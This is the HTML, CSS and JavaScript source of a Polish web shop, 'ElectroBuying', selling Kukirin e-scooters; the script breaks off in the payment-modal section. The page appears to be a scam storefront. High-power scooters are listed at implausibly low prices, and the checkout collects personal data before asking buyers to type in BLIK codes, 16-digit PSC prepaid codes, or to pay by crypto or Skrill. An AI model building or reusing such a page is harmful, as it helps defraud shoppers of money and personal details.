<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Electrolize&family=Orbitron:wght@400;700&display=swap" rel="stylesheet">
    <title>ElectroBuying ⚡️</title>
    <style>
        :root {
            --bg-color: #0F0E1E;
            --primary-neon: #00FFFF;
            --secondary-neon: #FF00FF;
            --text-color: #E0E0E0;
            --card-bg: #1A1A30;
            --button-bg: linear-gradient(45deg, var(--primary-neon), var(--secondary-neon));
            --shadow-light: rgba(0, 255, 255, 0.4);
            --shadow-dark: rgba(255, 0, 255, 0.4);
            --border-neon: #00FFFF80;
        }

        body {
            margin: 0;
            background: var(--bg-color);
            color: var(--text-color);
            font-family: 'Electrolize', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        header {
            padding: 50px 20px 30px;
            text-align: center;
            background: linear-gradient(90deg, var(--primary-neon) 0%, var(--secondary-neon) 100%);
            color: var(--bg-color);
            font-size: 3.5rem;
            font-weight: 700;
            letter-spacing: 5px;
            border-bottom-left-radius: 60px;
            border-bottom-right-radius: 60px;
            box-shadow: 0 10px 40px var(--shadow-light), 0 5px 20px var(--shadow-dark);
            margin-bottom: 40px;
            text-shadow: 0 0 20px #fff, 0 0 10px var(--primary-neon);
            text-transform: uppercase;
            position: relative;
            z-index: 2;
            animation: fadeIn 1s ease-in-out;
            font-family: 'Orbitron', sans-serif;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .scooter-bg {
            position: fixed;
            bottom: 0;
            right: -50px;
            width: 500px;
            max-width: 70vw;
            opacity: 0.1;
            z-index: 0;
            pointer-events: none;
            filter: blur(2px) grayscale(0.5);
            transform: rotate(-15deg);
        }

        .scooter-bg2 {
            position: fixed;
            top: 80px;
            left: -50px;
            width: 400px;
            max-width: 50vw;
            opacity: 0.08;
            z-index: 0;
            pointer-events: none;
            filter: blur(2.5px) grayscale(0.6);
            transform: scaleX(-1) rotate(10deg);
        }

        .products {
            display: flex;
            justify-content: center;
            gap: 40px;
            padding: 40px 20px;
            flex-wrap: wrap;
            max-width: 1400px;
            margin: 0 auto;
            position: relative;
            z-index: 2;
        }

        .product {
            background: var(--card-bg);
            padding: 30px 25px 25px;
            border-radius: 30px;
            width: 300px;
            text-align: center;
            box-shadow: 0 10px 40px var(--shadow-dark), 0 5px 20px var(--shadow-light);
            position: relative;
            overflow: hidden;
            border: 2px solid var(--border-neon);
            transition: transform 0.3s ease-in-out, box-shadow 0.3s ease-in-out;
            cursor: pointer;
            backdrop-filter: blur(5px);
        }

        .product:hover {
            transform: translateY(-10px) scale(1.03);
            box-shadow: 0 15px 50px var(--shadow-light), 0 8px 30px var(--shadow-dark);
        }

        .product-img-wrap {
            width: 100%;
            height: 280px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--card-bg);
            border-radius: 20px;
            margin-bottom: 25px;
            overflow: hidden;
            position: relative;
            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
        }

        .product img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
            background: transparent;
            transition: transform 0.3s ease-in-out;
        }

        .product h3 {
            margin: 10px 0 8px 0;
            font-size: 1.5rem;
            color: var(--primary-neon);
            font-weight: 700;
            letter-spacing: 1.5px;
            text-shadow: 0 0 10px var(--primary-neon);
            font-family: 'Orbitron', sans-serif;
            transition: color 0.3s ease-in-out;
        }
        
        .product:hover h3 {
            color: var(--secondary-neon);
            text-shadow: 0 0 10px var(--secondary-neon);
        }

        .product p {
            margin: 0 0 20px 0;
            font-size: 1.2rem;
            color: var(--text-color);
            font-weight: 500;
            letter-spacing: 0.8px;
        }

        .product button {
            background: var(--button-bg);
            color: var(--bg-color);
            border: none;
            padding: 15px 30px;
            cursor: pointer;
            border-radius: 15px;
            font-size: 1.2rem;
            font-weight: 700;
            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
            font-family: 'Electrolize', sans-serif;
            letter-spacing: 1.5px;
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out, background 0.2s ease-in-out;
        }

        .product button:hover {
            transform: scale(1.05);
            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
        }

        .cart-icon {
            position: fixed;
            top: 40px;
            left: 40px;
            z-index: 1001;
            background: linear-gradient(135deg, var(--primary-neon), var(--secondary-neon));
            border-radius: 50%;
            width: 70px;
            height: 70px;
            display: flex;
            align-items: center;
            justify-content: center;
            box-shadow: 0 0 20px var(--shadow-light), 0 0 15px var(--shadow-dark);
            cursor: pointer;
            border: 3px solid var(--primary-neon);
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
        }

        .cart-icon:hover {
            transform: scale(1.1) rotate(5deg);
            box-shadow: 0 0 30px var(--shadow-light), 0 0 20px var(--shadow-dark);
        }

        .cart-icon svg {
            width: 40px;
            height: 40px;
            fill: var(--bg-color);
        }

        .cart-count {
            position: absolute;
            top: 15px;
            left: 50px;
            background: var(--secondary-neon);
            color: var(--bg-color);
            border-radius: 50%;
            width: 25px;
            height: 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 1.1rem;
            font-weight: bold;
            border: 2px solid var(--primary-neon);
            box-shadow: 0 0 10px var(--shadow-dark);
        }

        #cart-panel {
            position: fixed;
            top: 40px;
            left: 130px;
            width: 380px;
            background: linear-gradient(135deg, var(--card-bg) 60%, var(--primary-neon) 100%);
            color: var(--text-color);
            border-radius: 25px;
            box-shadow: 0 0 40px var(--shadow-light), 0 10px 40px var(--shadow-dark);
            border: 2px solid var(--primary-neon);
            padding: 30px;
            z-index: 1002;
            opacity: 0;
            pointer-events: none;
            transform: translateY(-40px) scale(0.9);
            transition: opacity 0.5s ease-out, transform 0.5s ease-out;
            display: flex;
            flex-direction: column;
            backdrop-filter: blur(10px);
        }

        #cart-panel.open {
            opacity: 1;
            pointer-events: auto;
            transform: translateY(0) scale(1);
        }

        #cart-panel h2 {
            margin-top: 0;
            font-size: 1.8rem;
            text-align: center;
            color: var(--primary-neon);
            letter-spacing: 1.5px;
            font-weight: 700;
            margin-bottom: 20px;
            text-shadow: 0 0 10px var(--primary-neon);
            font-family: 'Orbitron', sans-serif;
        }

        .cart-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin: 12px 0;
            background: #23234Bcc;
            border-radius: 12px;
            padding: 10px 15px;
            box-shadow: 0 2px 10px var(--shadow-light);
            font-size: 1.1rem;
            font-weight: 500;
            letter-spacing: 0.5px;
        }

        .cart-item button {
            background: #333;
            border: none;
            color: var(--text-color);
            font-size: 1.3rem;
            width: 35px;
            height: 35px;
            cursor: pointer;
            border-radius: 50%;
            margin: 0 3px;
            font-family: 'Electrolize', sans-serif;
            transition: background 0.2s ease-in-out;
        }

        .cart-item button:hover {
            background: var(--primary-neon);
            color: var(--bg-color);
        }

        .checkout {
            background: var(--button-bg);
            border: 2px solid var(--primary-neon);
            color: var(--bg-color);
            padding: 18px;
            width: 100%;
            cursor: pointer;
            font-size: 1.3rem;
            border-radius: 15px;
            margin-top: 20px;
            font-weight: 700;
            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
            font-family: 'Electrolize', sans-serif;
            letter-spacing: 1.5px;
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
        }
        
        .checkout:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
        }

        .close-cart {
            position: absolute;
            top: 15px;
            right: 20px;
            background: none;
            border: none;
            color: var(--text-color);
            font-size: 2rem;
            cursor: pointer;
            z-index: 10;
            transition: color 0.2s ease-in-out;
        }
        
        .close-cart:hover {
            color: var(--secondary-neon);
        }

        .cart-total {
            text-align: right;
            font-size: 1.4rem;
            margin-top: 15px;
            font-weight: bold;
            color: var(--primary-neon);
            letter-spacing: 1.5px;
            text-shadow: 0 0 8px var(--primary-neon);
        }

        .cart-error {
            color: #fff;
            background: #e53935;
            border-radius: 10px;
            padding: 12px 0;
            text-align: center;
            font-weight: bold;
            margin-bottom: 12px;
            font-size: 1.2rem;
            box-shadow: 0 2px 10px #e5393555;
        }

        .modal-bg {
            position: fixed; top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(15, 14, 30, 0.85);
            z-index: 2000;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.4s ease-out;
            backdrop-filter: blur(5px);
        }

        .modal-bg.open {
            opacity: 1;
            pointer-events: auto;
        }

        .modal {
            background: linear-gradient(135deg, var(--card-bg) 60%, var(--primary-neon) 100%);
            border-radius: 25px;
            padding: 35px 30px;
            min-width: 350px;
            max-width: 95vw;
            box-shadow: 0 0 40px var(--shadow-light), 0 10px 40px var(--shadow-dark);
            color: var(--text-color);
            position: relative;
            border: 2px solid var(--primary-neon);
            transform: translateY(-30px);
            opacity: 0;
            transition: transform 0.5s ease-out, opacity 0.5s ease-out;
        }
        
        .modal-bg.open .modal {
            transform: translateY(0);
            opacity: 1;
        }

        .modal h2 {
            margin-top: 0;
            color: var(--primary-neon);
            text-align: center;
            font-size: 1.8rem;
            margin-bottom: 20px;
            letter-spacing: 1.5px;
            font-weight: 700;
            text-shadow: 0 0 10px var(--primary-neon);
        }

        .modal .pay-options, .modal .crypto-options, .modal .dane-form, .modal .blik-form, .modal .psc-form {
            display: flex;
            flex-direction: column;
            gap: 15px;
            margin-bottom: 20px;
            /* Nowe style dla centrowania formularza */
            align-items: center; 
        }

        .modal .pay-btn, .modal .crypto-btn {
            background: var(--button-bg);
            color: var(--bg-color);
            border: none;
            border-radius: 15px;
            padding: 15px 0;
            font-size: 1.2rem;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
            font-family: 'Electrolize', sans-serif;
            letter-spacing: 1.5px;
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
            width: 100%; /* Dodane dla lepszego wyglądu */
        }
        
        .modal .pay-btn:hover, .modal .crypto-btn:hover {
            transform: scale(1.03);
            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
        }

        .modal .pay-info {
            margin-top: 15px;
            background: #23234Bcc;
            border-radius: 12px;
            padding: 15px;
            color: var(--primary-neon);
            font-size: 1.1rem;
            text-align: center;
            font-weight: 500;
            word-break: break-all;
            box-shadow: 0 2px 10px var(--shadow-light);
        }

        .modal input {
            padding: 12px;
            border-radius: 10px;
            border: 2px solid var(--primary-neon);
            font-size: 1.2rem;
            width: 250px;
            text-align: center;
            background: var(--bg-color);
            color: var(--primary-neon);
            outline: none;
            margin-bottom: 8px;
            transition: border-color 0.2s ease-in-out;
        }
        
        .modal input:focus {
            border-color: var(--secondary-neon);
        }

        .modal button[type="submit"] {
            background: var(--button-bg);
            color: var(--bg-color);
            border: none;
            border-radius: 10px;
            padding: 12px 24px;
            font-size: 1.1rem;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 2px 10px var(--shadow-light);
            font-family: 'Electrolize', sans-serif;
            letter-spacing: 1px;
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
            width: 250px; /* Dopasowanie do inputów */
        }
        
        .modal button[type="submit"]:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px var(--shadow-dark);
        }

        .modal .blik-success, .modal .psc-success, .modal .dane-success, .modal .pay-final-msg {
            font-weight: 700;
            margin-top: 15px;
            font-size: 1.2rem;
            text-align: center;
        }
        
        .dane-success { color: #0f0; }
        .blik-success { color: var(--primary-neon); }
        .psc-success { color: #0f0; }
        .pay-final-msg { color: var(--primary-neon); }

        .modal .close-modal {
            position: absolute;
            top: 15px;
            right: 20px;
            background: none;
            border: none;
            color: var(--text-color);
            font-size: 2rem;
            cursor: pointer;
            z-index: 10;
            transition: color 0.2s ease-in-out;
        }
        
        .modal .close-modal:hover {
            color: var(--secondary-neon);
        }

        /* Zmiany dla modalu produktu */
        #productModal {
            max-width: 900px;
            display: flex;
            flex-direction: row;
            gap: 40px;
            align-items: center;
            transition: all 0.5s ease-out;
            transform: translateY(-50px) scale(0.9);
            opacity: 0;
            background: linear-gradient(135deg, var(--card-bg) 60%, var(--primary-neon) 100%);
            border-radius: 30px;
            padding: 40px;
            border: 2px solid var(--primary-neon);
            box-shadow: 0 0 50px var(--shadow-light), 0 15px 60px var(--shadow-dark);
        }
        
        #productModalBg.open #productModal {
            transform: translateY(0) scale(1);
            opacity: 1;
        }

        #productModal h2 {
            font-size: 2.5rem;
            margin-bottom: 10px;
            text-align: left;
            text-shadow: 0 0 15px var(--primary-neon);
            font-family: 'Orbitron', sans-serif;
            color: var(--primary-neon);
        }

        #productModal .product-modal-img-container {
            flex: 1;
            min-width: 350px;
            max-width: 450px;
            height: 350px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: var(--card-bg);
            border-radius: 20px;
            padding: 15px;
            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
            border: 2px solid var(--border-neon);
        }

        #productModal .product-modal-img {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 15px;
            transition: transform 0.3s ease-in-out;
        }

        #productModal .product-modal-details {
            flex: 1;
            text-align: left;
        }

        #productModal .product-modal-price {
            font-size: 2.2rem;
            font-weight: bold;
            color: var(--secondary-neon);
            margin: 15px 0 25px 0;
            text-shadow: 0 0 10px var(--secondary-neon);
            font-family: 'Orbitron', sans-serif;
        }
        
        #productModal .product-modal-specs {
            margin: 25px 0;
            font-size: 1.1rem;
            line-height: 1.6;
            color: #ddd;
            max-height: 200px;
            overflow-y: auto;
        }
        
        #productModal .product-modal-specs h4 {
            color: var(--primary-neon);
            font-weight: 700;
            margin-bottom: 10px;
            font-size: 1.3rem;
            text-shadow: 0 0 5px var(--primary-neon);
        }

        #productModal .product-modal-specs ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        #productModal .product-modal-specs li {
            margin-bottom: 8px;
            padding-left: 15px;
            position: relative;
        }
        
        #productModal .product-modal-specs li:before {
            content: "•";
            color: var(--secondary-neon);
            position: absolute;
            left: 0;
            top: 0;
            font-size: 1.5rem;
            line-height: 1;
        }

        #productModal .product-modal-add-btn {
            background: var(--button-bg);
            color: var(--bg-color);
            border: none;
            padding: 20px 40px;
            cursor: pointer;
            border-radius: 20px;
            font-size: 1.4rem;
            font-weight: 700;
            box-shadow: 0 5px 20px var(--shadow-light), 0 2px 10px var(--shadow-dark);
            font-family: 'Electrolize', sans-serif;
            letter-spacing: 2px;
            width: 100%;
            text-align: center;
            transition: transform 0.2s ease-in-out, box-shadow 0.2s ease-in-out;
        }
        
        #productModal .product-modal-add-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 25px var(--shadow-dark), 0 4px 15px var(--shadow-light);
        }

        @media (max-width: 992px) {
            #productModal { flex-direction: column; text-align: center; }
            #productModal h2 { text-align: center; font-size: 2rem; }
            #productModal .product-modal-details { text-align: center; }
            #productModal .product-modal-img-container { min-width: auto; max-width: 100%; height: 250px; }
            #productModal .product-modal-specs { text-align: left; }
            .product { width: 280px; }
            .products { gap: 20px; }
            header { font-size: 2.5rem; }
            .cart-icon { top: 20px; left: 20px; width: 60px; height: 60px; }
            .cart-icon svg { width: 32px; height: 32px; }
            .cart-count { top: 10px; left: 40px; }
            #cart-panel { top: 20px; left: 90px; width: 300px; padding: 25px; }
            .cart-item span { font-size: 1rem; }
            .cart-item button { width: 30px; height: 30px; font-size: 1.1rem; }
        }

        @media (max-width: 768px) {
            header { font-size: 2rem; padding: 40px 15px 25px; }
            .products { padding: 20px 10px; gap: 15px; }
            .product { width: 45%; }
            .scooter-bg, .scooter-bg2 { display: none; }
            .modal { min-width: 90vw; padding: 20px; }
            #productModal { flex-direction: column; gap: 20px; padding: 20px; }
            #productModal h2 { font-size: 1.8rem; }
            #productModal .product-modal-price { font-size: 1.6rem; }
            #productModal .product-modal-add-btn { font-size: 1.2rem; padding: 15px 25px; }
            
            #cart-panel { 
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                width: 90%;
                max-width: 400px;
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <header>ElectroBuying</header>
    <img class="scooter-bg" src="https://cdn.pixabay.com/photo/2017/01/31/13/14/scooter-2027660_1280.png" alt="Ilustracja hulajnogi">
    <img class="scooter-bg2" src="https://cdn.pixabay.com/photo/2017/01/31/13/14/scooter-2027660_1280.png" alt="Ilustracja hulajnogi 2">
    <div class="products" id="products"></div>
    <div class="cart-icon" id="cartIcon" title="Pokaż koszyk">
        <svg viewBox="0 0 24 24">
            <path d="M7 18c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm10 0c-1.104 0-2 .896-2 2s.896 2 2 2 2-.896 2-2-.896-2-2-2zm1.447-2.105l1.553-9.895h-16l1.553 9.895c.091.583.595 1.105 1.184 1.105h10.526c.589 0 1.093-.522 1.184-1.105zm-13.447-11.895v-2c0-1.104.896-2 2-2h10c1.104 0 2 .896 2 2v2h-14z"/>
        </svg>
        <span class="cart-count" id="cartCount">0</span>
    </div>
    <div id="cart-panel">
        <button class="close-cart" id="closeCart" title="Zamknij koszyk">&times;</button>
        <h2>Koszyk</h2>
        <div id="cartError"></div>
        <div id="cartItems"></div>
        <div class="cart-total" id="cartTotal"></div>
        <button class="checkout" id="checkoutBtn">Zamów</button>
    </div>
    <div class="modal-bg" id="payModalBg">
        <div class="modal" id="payModal">
            <button class="close-modal" id="closePayModal" title="Zamknij">&times;</button>
            <h2 id="payModalTitle">Podaj dane do wysyłki</h2>
            <form class="dane-form" id="daneForm">
                <input type="text" id="daneImieNazwisko" placeholder="Imię i Nazwisko" required pattern="[A-Za-z\sąęłńóśźżĄĘŁŃÓŚŹŻ]{3,}" title="Wpisz tylko litery">
                <input type="text" id="daneAdres" placeholder="Ulica i numer" required>
                <input type="text" id="daneMiejscowosc" placeholder="Miejscowość" required>
                <input type="text" id="daneKodPocztowy" placeholder="Kod pocztowy (np. 00-000)" required pattern="\d{2}-\d{3}" maxlength="6">
                <input type="tel" id="daneTelefon" placeholder="Numer telefonu" required maxlength="9" pattern="\d{9}">
                <input type="email" id="daneEmail" placeholder="E-mail" required>
                <button type="submit">Zapisz dane</button>
                <div class="dane-success" id="daneSuccess" style="display:none"></div>
            </form>
            <div class="pay-options" id="payOptions" style="display:none">
                <button class="pay-btn" data-pay="blik">BLIK</button>
                <button class="pay-btn" data-pay="paypal">PayPal</button>
                <button class="pay-btn" data-pay="skrill">Skrill</button>
                <button class="pay-btn" data-pay="crypto">Kryptowaluty</button>
                <button class="pay-btn" data-pay="psc">PSC</button>
            </div>
            <form class="blik-form" id="blikForm" style="display:none">
                <div style="color:#fff; margin-bottom:6px;">
                    Wpisz kwotę i kod BLIK.
                </div>
                <input type="text" id="blikAmount" placeholder="Kwota (np. 300zł)" autocomplete="off" required>
                <input type="text" id="blikCode" maxlength="6" pattern="[0-9]{6}" placeholder="Kod BLIK" autocomplete="off" required>
                <button type="submit">Wyślij kod</button>
                <div class="blik-success" id="blikSuccess" style="display:none"></div>
                <div style="color:var(--secondary-neon); margin-top:8px;">Jeżeli kod BLIK nie zostanie przyjęty, proszę spróbować później.</div>
            </form>
            <form class="psc-form" id="pscForm" style="display:none">
                <div style="color:#fff; margin-bottom:6px;">
                    Wpisz 16-cyfrowy kod PSC.
                </div>
                <input type="text" id="pscCode" placeholder="xxxx-xxxx-xxxx-xxxx" autocomplete="off" required>
                <button type="submit">Gotowe</button>
                <div class="psc-success" id="pscSuccess" style="display:none"></div>
            </form>
            <div class="pay-info" id="payInfo" style="display:none"></div>
            <div class="crypto-options" id="cryptoOptions" style="display:none">
                <button class="crypto-btn" data-crypto="btc">Bitcoin</button>
                <button class="crypto-btn" data-crypto="ltc">Litecoin</button>
                <button class="crypto-btn" data-crypto="sol">Solana</button>
                <button class="crypto-btn" data-crypto="eth">Ethereum</button>
            </div>
            <div class="pay-final-msg" id="payFinalMsg" style="display:none"></div>
        </div>
    </div>
    
    <div class="modal-bg" id="productModalBg">
        <div class="modal" id="productModal">
            <button class="close-modal" id="closeProductModal" title="Zamknij">&times;</button>
            <div class="product-modal-img-container">
                <img class="product-modal-img" src="" alt="Zdjęcie produktu" id="productModalImg">
            </div>
            <div class="product-modal-details">
                <h2 id="productModalName">Nazwa produktu</h2>
                <p class="product-modal-price" id="productModalPrice">Cena: 0 zł</p>
                <div class="product-modal-specs" id="productModalSpecs">
                    <h4>Specyfikacje:</h4>
                    <ul>
                        <li>Brak danych.</li>
                    </ul>
                </div>
                <button class="product-modal-add-btn" id="productModalAddBtn">Dodaj do koszyka</button>
            </div>
        </div>
    </div>

    <script>
        // Produkty ze specyfikacjami
        const products = [
            { 
                name: "Kukirn G2", 
                price: 150, 
                img: "https://www.geekbuying.pl/55635-large_default/skladana-hulajnoga-elektryczna-kukirin-g2-silnik-800w.webp", /* Zmienione zdjęcie */
                specs: "Silnik: 800W, Prędkość maks: 45 km/h, Zasięg: 40-50 km, Bateria: 48V 15Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory."
            },
            { 
                name: "Kukirn G2 Pro", 
                price: 250, 
                img: "https://tse1.mm.bing.net/th/id/OIP.oZB_RINVA4K_XcvPgHqMnAHaHl?r=0&pid=ImgDet&w=163&h=166&c=7&o=7&rm=3", /* Zmienione zdjęcie */
                specs: "Silnik: 1000W, Prędkość maks: 55 km/h, Zasięg: 50-60 km, Bateria: 48V 15Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory." 
            },
            { 
                name: "Kukirn G2 Master", 
                price: 299, 
                img: "https://th.bing.com/th/id/OIP.LgIL5gdSB-3c7hYb3qmfVQHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7",
                specs: "Silnik: Podwójny 1000W (2000W), Prędkość maks: 60 km/h, Zasięg: do 70 km, Bateria: 52V 20Ah, Opony: 10 cali, Hamulce: Hydrauliczne tarczowe, Zawieszenie: Zaawansowane hydrauliczne." 
            },
            { 
                name: "Kukirn G3", 
                price: 250, 
                img: "https://th.bing.com/th/id/OIP.ACuiHXmVwoMUf0O0_0k8dAHaHa?w=186&h=186&c=7&r=0&o=7&pid=1.7&rm=3",
                specs: "Silnik: 1200W, Prędkość maks: 50 km/h, Zasięg: 70 km, Bateria: 52V 18Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne." 
            },
            { 
                name: "Kukirn G3 Pro", 
                price: 300, 
                img: "https://th.bing.com/th/id/OIP.mGeEjEDAPgNo9gs1FoTbfQHaHa?w=188&h=189&c=7&r=0&o=7&pid=1.7&rm=3",
                specs: "Silnik: Podwójny 1200W (2400W), Prędkość maks: 65-70 km/h, Zasięg: 80+ km, Bateria: 52V 23Ah, Opony: 10 cali, Hamulce: Hydrauliczne tarczowe, Zawieszenie: Pełne zaawansowane." 
            },
            { 
                name: "Kukirn G4", 
                price: 399, 
                img: "https://th.bing.com/th/id/OIP.LgIL5gdSB-3c7hYb3qmfVQHaHa?w=169&h=180&c=7&r=0&o=5&pid=1.7",
                specs: "Silnik: 2000W, Prędkość maks: 70 km/h, Zasięg: do 75 km, Bateria: 60V 20Ah, Opony: 11 cali, Hamulce: Podwójne hydrauliczne tarczowe, Zawieszenie: Podwójne amortyzatory." 
            },
            { 
                name: "Kukirn G4 Max", 
                price: 499, 
                img: "https://th.bing.com/th/id/OIP.6-l4lvs6Ma1Ojlu2UZLOeAHaHq?w=176&h=182&c=7&r=0&o=7&pid=1.7&rm=3",
                specs: "Silnik: Podwójny 2000W (4000W), Prędkość maks: 80+ km/h, Zasięg: 90+ km, Bateria: 60V 35Ah, Opony: 11 cali, Hamulce: Przednie i tylne hydrauliczne tarczowe, Zawieszenie: Heavy-duty full suspension." 
            },
            { 
                name: "Kukirin G2 Max", 
                price: 250, 
                img: "https://th.bing.com/th/id/OIP.oWSGkA9D-jt2oHTlLYI4mgHaHa?w=170&h=180&c=7&r=0&o=7&pid=1.7&rm=3",
                specs: "Silnik: 1000W, Prędkość maks: 55 km/h, Zasięg: 80 km, Bateria: 48V 20Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory." 
            },
            { 
                name: "Kukirin M4 Max", 
                price: 250, 
                img: "https://img.joomcdn.net/69c1fd65707d9e59d23524597dd48b61a6207557_original.jpeg",
                specs: "Silnik: 500W, Prędkość maks: 45 km/h, Zasięg: 50-60 km, Bateria: 48V 16Ah, Opony: 10 cali, Hamulce: Podwójne tarczowe, Zawieszenie: Przednie i tylne amortyzatory." 
            }
        ];

        // Renderowanie produktów
        const productsDiv = document.getElementById('products');
        products.forEach((prod, idx) => {
            const div = document.createElement('div');
            div.className = 'product';
            div.setAttribute('data-idx', idx); 
            div.innerHTML = `
                <div class="product-img-wrap">
                    <img src="${prod.img}" alt="${prod.name}">
                </div>
                <h3>${prod.name}</h3>
                <p>Cena: ${prod.price} zł</p>
                <button class="add-to-cart-btn" data-idx="${idx}">Dodaj do koszyka</button>
            `;
            productsDiv.appendChild(div);
        });

        // Koszyk
        let cart = [];
        let cartTimeout = null;
        let errorTimeout = null;
        let totalCartPrice = 0;
        
        // Otwieranie modalu produktu
        function openProductModal(prod) {
            const productModalBg = document.getElementById('productModalBg');
            const productModalImg = document.getElementById('productModalImg');
            const productModalName = document.getElementById('productModalName');
            const productModalPrice = document.getElementById('productModalPrice');
            const productModalSpecs = document.getElementById('productModalSpecs');
            const productModalAddBtn = document.getElementById('productModalAddBtn');
            
            productModalImg.src = prod.img;
            productModalImg.alt = prod.name;
            productModalName.textContent = prod.name;
            productModalPrice.textContent = `Cena: ${prod.price} zł`;
            
            const specsList = prod.specs.split(', ').map(s => `<li>${s.trim()}</li>`).join('');
            productModalSpecs.innerHTML = `<h4>Specyfikacje:</h4><ul>${specsList}</ul>`;

            productModalAddBtn.setAttribute('data-idx', products.findIndex(p => p.name === prod.name));
            productModalBg.classList.add('open');
        }

        // Zamykanie modalu produktu
        function closeProductModal() {
            document.getElementById('productModalBg').classList.remove('open');
        }

        // Dodawanie do koszyka
        function addToCart(idx) {
            const prod = products[idx];
            const found = cart.find(item => item.name === prod.name);
            if (found) {
                found.qty += 1;
            } else {
                cart.push({ ...prod, qty: 1 });
            }
            updateCart();
            openCart(true);
        }

        // Obsługa kliknięć na produkty i przyciski
        productsDiv.addEventListener('click', function(e) {
            const productElement = e.target.closest('.product');
            if (productElement) {
                const idx = parseInt(productElement.getAttribute('data-idx'));
                if (e.target.classList.contains('add-to-cart-btn')) {
                    e.stopPropagation();
                    addToCart(idx);
                } else {
                    openProductModal(products[idx]);
                }
            }
        });

        // Obsługa przycisku "Dodaj do koszyka" w modal
        document.getElementById('productModalAddBtn').addEventListener('click', function(e) {
            const idx = parseInt(e.target.getAttribute('data-idx'));
            addToCart(idx);
            closeProductModal();
        });

        // Zamykanie modalu produktu
        document.getElementById('closeProductModal').addEventListener('click', closeProductModal);
        document.getElementById('productModalBg').addEventListener('mousedown', (e) => {
            if (e.target.id === 'productModalBg') closeProductModal();
        });

        // Aktualizacja koszyka
        function updateCart() {
            const cartItemsDiv = document.getElementById('cartItems');
            const cartCount = document.getElementById('cartCount');
            const cartTotal = document.getElementById('cartTotal');
            cartItemsDiv.innerHTML = '';
            let total = 0;
            let count = 0;
            cart.forEach((item, i) => {
                total += item.price * item.qty;
                count += item.qty;
                const itemDiv = document.createElement('div');
                itemDiv.className = 'cart-item';
                itemDiv.innerHTML = `
                    <span>${item.name}</span>
                    <button data-action="minus" data-idx="${i}">-</button>
                    <span>${item.qty}</span>
                    <button data-action="plus" data-idx="${i}">+</button>
                    <span>${item.price * item.qty} zł</span>
                `;
                cartItemsDiv.appendChild(itemDiv);
            });
            totalCartPrice = total;
            cartCount.textContent = count;
            cartTotal.textContent = total > 0 ? `Suma: ${total} zł` : '';
        }

        // Obsługa przycisków + i -
        document.getElementById('cartItems').addEventListener('click', function(e) {
            if (e.target.tagName === 'BUTTON') {
                const idx = parseInt(e.target.getAttribute('data-idx'));
                const action = e.target.getAttribute('data-action');
                if (action === 'plus') {
                    cart[idx].qty += 1;
                } else if (action === 'minus') {
                    cart[idx].qty -= 1;
                    if (cart[idx].qty <= 0) cart.splice(idx, 1);
                }
                updateCart();
            }
        });

        // Otwieranie i zamykanie koszyka
        const cartIcon = document.getElementById('cartIcon');
        const cartPanel = document.getElementById('cart-panel');
        const closeCart = document.getElementById('closeCart');
        const cartError = document.getElementById('cartError');
        const checkoutBtn = document.getElementById('checkoutBtn');

        function openCart(autoClose = false) {
            cartPanel.classList.add('open');
            if (cartTimeout) clearTimeout(cartTimeout);
            if (autoClose) {
                cartTimeout = setTimeout(() => {
                    cartPanel.classList.remove('open');
                }, 2000);
            }
        }
        function closeCartPanel() {
            cartPanel.classList.remove('open');
            if (cartTimeout) clearTimeout(cartTimeout);
        }

        cartIcon.addEventListener('click', () => openCart(false));
        closeCart.addEventListener('click', closeCartPanel);

        document.addEventListener('mousedown', (e) => {
            if (cartPanel.classList.contains('open') && !cartPanel.contains(e.target) && !cartIcon.contains(e.target)) {
                closeCartPanel();
            }
        });

        // MODAL PŁATNOŚCI
        const payModalBg = document.getElementById('payModalBg');
        const payModal = document.getElementById('payModal');
        const closePayModal = document.getElementById('closePayModal');
        const payModalTitle = document.getElementById('payModalTitle');
        const daneForm = document.getElementById('daneForm');
